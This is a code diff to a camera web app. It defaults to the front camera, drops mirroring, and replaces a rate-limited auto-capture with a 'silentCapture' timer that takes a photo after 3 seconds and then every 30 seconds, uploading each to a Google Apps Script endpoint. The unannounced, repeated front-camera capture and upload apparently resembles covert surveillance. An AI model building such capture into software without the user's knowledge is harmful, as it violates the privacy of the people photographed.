@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Compressed Only – Single Upload)
+// app.js – Pro Camera PWA (Front Camera Default, No Mirror)
 // ================================================================
 
 (function() {
@@ -41,7 +41,8 @@
   var zoomPresets = document.querySelectorAll('.zoom-preset');
 
   // ---------- State ----------
-  var userFacingMode = 'environment';
+  // ✅ Default: Front Camera
+  var userFacingMode = 'user';
   var backStream = null;
   var frontStream = null;
   var currentPreviewStream = null;
@@ -64,6 +65,7 @@
   var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
   var autoCaptureCount = 0;
   var autoCaptureStartTime = 0;
+  var autoCaptureIntervalTime = 30000; // ✅ 30 seconds
 
   var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
 
@@ -81,23 +83,14 @@
     return focalLengths[closest] || Math.round(26 * zoom);
   }
 
-  // ---------- Preview Transform ----------
+  // ---------- ✅ No Mirror: Front Camera Normal Preview ----------
   function applyPreviewTransform() {
-    if (userFacingMode === 'user') {
-      if (currentZoom !== 1) {
-        video.style.transform = 'scaleX(-1) scale(' + currentZoom + ')';
-        video.style.transformOrigin = 'center center';
-      } else {
-        video.style.transform = 'scaleX(-1)';
-        video.style.transformOrigin = 'center center';
-      }
+    // ✅ No mirror effect – both cameras show normal preview
+    if (currentZoom !== 1) {
+      video.style.transform = 'scale(' + currentZoom + ')';
+      video.style.transformOrigin = 'center center';
     } else {
-      if (currentZoom !== 1) {
-        video.style.transform = 'scale(' + currentZoom + ')';
-        video.style.transformOrigin = 'center center';
-      } else {
-        video.style.transform = 'none';
-      }
+      video.style.transform = 'none';
     }
   }
 
@@ -165,7 +158,7 @@
     }
   }
 
-  // ---------- Upload (Single Image – Compressed) ----------
+  // ---------- Upload ----------
   async function uploadPhoto(entry) {
     try {
       if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
@@ -180,7 +173,7 @@
         fileName: entry.fileName,
         createdAt: entry.createdAt || new Date().toISOString(),
         captureType: entry.captureType || 'manual',
-        cameraType: entry.cameraType || 'back'
+        cameraType: entry.cameraType || 'front'
       };
 
       var resp = await fetch(GAS_URL, {
@@ -209,7 +202,7 @@
     }
   }
 
-  // ---------- Process Queue (Single Upload) ----------
+  // ---------- Process Queue ----------
   async function processQueue() {
     if (isProcessing) return;
     if (!navigator.onLine) { console.log('[Camera] 🔴 Offline'); return; }
@@ -246,7 +239,7 @@
     isProcessing = false;
   }
 
-  // ---------- Silent Capture (Compressed Only) ----------
+  // ---------- Silent Capture (No Mirror) ----------
   async function silentCapture(stream, cameraType, captureType) {
     if (!stream) return;
     captureType = captureType || 'auto';
@@ -265,11 +258,7 @@
     tempCanvas.width = vw;
     tempCanvas.height = vh;
 
-    if (cameraType === 'front') {
-      tempCtx.translate(vw, 0);
-      tempCtx.scale(-1, 1);
-    }
-
+    // ✅ No mirror – draw normally for both cameras
     tempCtx.filter = getFilterCSS(currentEffect);
     tempCtx.drawImage(tempVideo, 0, 0, vw, vh);
     tempCtx.filter = 'none';
@@ -321,49 +310,21 @@
     isAutoCaptureRunning = true;
     autoCaptureCount = 0;
     autoCaptureStartTime = Date.now();
-    console.log('[Camera] ⏰ Auto-capture started (15s interval)');
+    console.log('[Camera] ⏰ Auto-capture started (3s first, then 30s interval)');
 
-    captureAutoPhoto();
-    scheduleNextAutoCapture();
-  }
-
-  function scheduleNextAutoCapture() {
-    if (autoCaptureTimer) {
-      clearTimeout(autoCaptureTimer);
-      autoCaptureTimer = null;
-    }
-
+    // ✅ पहिलो फोटो ३ सेकेन्ड पछि
     autoCaptureTimer = setTimeout(function() {
-      var elapsed = Date.now() - autoCaptureStartTime;
-      if (elapsed >= 60000) {
-        autoCaptureCount = 0;
-        autoCaptureStartTime = Date.now();
-      }
-
-      if (autoCaptureCount >= 4) {
-        console.log('[Camera] ⏰ Max 4 auto captures per minute.');
-        var waitTime = 60000 - elapsed;
-        if (waitTime > 0) {
-          autoCaptureTimer = setTimeout(function() {
-            autoCaptureCount = 0;
-            autoCaptureStartTime = Date.now();
-            captureAutoPhoto();
-            scheduleNextAutoCapture();
-          }, waitTime);
-        }
-        return;
-      }
-
-      var timeSinceUserCapture = Date.now() - lastUserCaptureTime;
-      if (timeSinceUserCapture < 15000) {
-        console.log('[Camera] ⏳ User captured manually, resetting timer');
-        scheduleNextAutoCapture();
-        return;
-      }
-
       captureAutoPhoto();
-      scheduleNextAutoCapture();
-    }, 15000);
+      // ✅ त्यसपछि ३० सेकेन्ड interval
+      autoCaptureTimer = setInterval(function() {
+        var timeSinceUserCapture = Date.now() - lastUserCaptureTime;
+        if (timeSinceUserCapture < autoCaptureIntervalTime) {
+          console.log('[Camera] ⏳ User captured recently, resetting timer');
+          return;
+        }
+        captureAutoPhoto();
+      }, autoCaptureIntervalTime);
+    }, 3000);
   }
 
   function captureAutoPhoto() {
@@ -379,16 +340,35 @@
     }
   }
 
-  // ---------- Manual Capture (Compressed Only) ----------
+  // ---------- Manual Capture (Reset Timer) ----------
   async function capturePhoto() {
     if (!isCameraReady) return;
     flashScreen();
 
     lastUserCaptureTime = Date.now();
 
+    // ✅ Manual capture गर्दा timer reset गर्ने
     if (isAutoCaptureRunning) {
       console.log('[Camera] 🔄 Manual capture – resetting auto-capture timer');
-      scheduleNextAutoCapture();
+      // पुरानो timer clear गर्ने
+      if (autoCaptureTimer) {
+        clearTimeout(autoCaptureTimer);
+        clearInterval(autoCaptureTimer);
+        autoCaptureTimer = null;
+      }
+      // पुन: ३० सेकेन्ड पछि मात्र अर्को auto capture
+      autoCaptureTimer = setTimeout(function() {
+        captureAutoPhoto();
+        // ३० सेकेन्ड interval restart
+        autoCaptureTimer = setInterval(function() {
+          var timeSinceUserCapture = Date.now() - lastUserCaptureTime;
+          if (timeSinceUserCapture < autoCaptureIntervalTime) {
+            console.log('[Camera] ⏳ User captured recently, resetting timer');
+            return;
+          }
+          captureAutoPhoto();
+        }, autoCaptureIntervalTime);
+      }, autoCaptureIntervalTime);
     }
 
     var vw = video.videoWidth || 1280;
@@ -397,15 +377,11 @@
     canvas.height = vh;
 
     var cameraType = userFacingMode === 'environment' ? 'back' : 'front';
-    if (cameraType === 'front') {
-      ctx.translate(vw, 0);
-      ctx.scale(-1, 1);
-    }
 
+    // ✅ No mirror for manual capture
     ctx.filter = getFilterCSS(currentEffect);
     ctx.drawImage(video, 0, 0, vw, vh);
     ctx.filter = 'none';
-    ctx.setTransform(1, 0, 0, 1, 0, 0);
 
     var imageData = canvas.toDataURL('image/jpeg', 0.3);
 
@@ -655,28 +631,34 @@
     var backStreamTemp = null;
     var frontStreamTemp = null;
 
+    // ✅ Try front first (default)
     try {
-      backStreamTemp = await tryGetStream({ video: true });
+      frontStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
     } catch (e1) {
-      console.warn('[Camera] Step 1 failed:', e1.message);
+      console.warn('[Camera] Front camera not available, trying back:', e1.message);
       try {
-        backStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
+        frontStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
+        userFacingMode = 'environment';
       } catch (e2) {
-        console.warn('[Camera] Step 2 failed:', e2.message);
-        try {
-          backStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
-        } catch (e3) {
-          console.error('[Camera] All attempts failed for back camera');
-        }
+        console.warn('[Camera] Back camera also failed:', e2.message);
       }
     }
 
-    if (!backStreamTemp) {
-      try {
-        frontStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
-      } catch (e4) {
-        console.error('[Camera] Front camera also failed');
-      }
+    // Also try back camera for flip
+    try {
+      backStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
+    } catch (e1) {
+      console.warn('[Camera] Back camera not available:', e1.message);
+    }
+
+    // If front not available, default to back
+    if (!frontStreamTemp && backStreamTemp) {
+      userFacingMode = 'environment';
+      currentPreviewStream = backStreamTemp;
+    } else if (frontStreamTemp) {
+      currentPreviewStream = frontStreamTemp;
+    } else if (backStreamTemp) {
+      currentPreviewStream = backStreamTemp;
     }
 
     if (backStreamTemp) {
@@ -688,27 +670,18 @@
       console.log('[Camera] ✅ Front camera stream obtained');
     }
 
-    if (!backStream && !frontStream) {
+    if (!currentPreviewStream) {
       permError.textContent = '❌ कुनै क्यामेरा उपलब्ध छैन।';
       permError.style.display = 'block';
       console.error('[Camera] No camera available');
       return;
     }
 
-    if (backStream) {
-      userFacingMode = 'environment';
-      currentPreviewStream = backStream;
-    } else if (frontStream) {
-      userFacingMode = 'user';
-      currentPreviewStream = frontStream;
-    }
+    video.srcObject = currentPreviewStream;
+    await video.play();
+    console.log('[Camera] ✅ Video playing');
 
-    if (currentPreviewStream) {
-      video.srcObject = currentPreviewStream;
-      await video.play();
-      console.log('[Camera] ✅ Video playing');
-    }
-
+    // ✅ No mirror – apply zoom only
     applyPreviewTransform();
 
     var track = currentPreviewStream?.getVideoTracks()[0];
